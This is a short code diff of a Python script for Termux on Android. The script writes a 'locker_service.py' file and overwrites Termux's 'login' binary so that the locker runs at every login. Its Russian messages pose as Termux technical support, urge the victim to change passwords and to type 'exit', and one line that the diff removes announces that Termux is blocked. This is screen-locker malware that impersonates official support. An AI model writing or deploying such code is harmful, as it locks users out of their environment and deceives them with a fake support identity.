@@ -1,6 +1,4 @@
-import time
-import os
-import sys
+import time, os, sys
 from colorama import Fore
 os.system('clear')
 file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
@@ -50,7 +48,7 @@ print('Просим вас сменить все пароли, а также о�
 print()
 print('Для вашей безопастности пропишите 2 раза команду: "exit".')
 print()
-print('Ваш Termux заблокирован.\n © Тех.поддержка инструмента Termux.')
+print('         © Тех.поддержка инструмента Termux.')
 file = open('/data/data/com.termux/files/usr/bin/login', 'w')
 file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
 file.close()
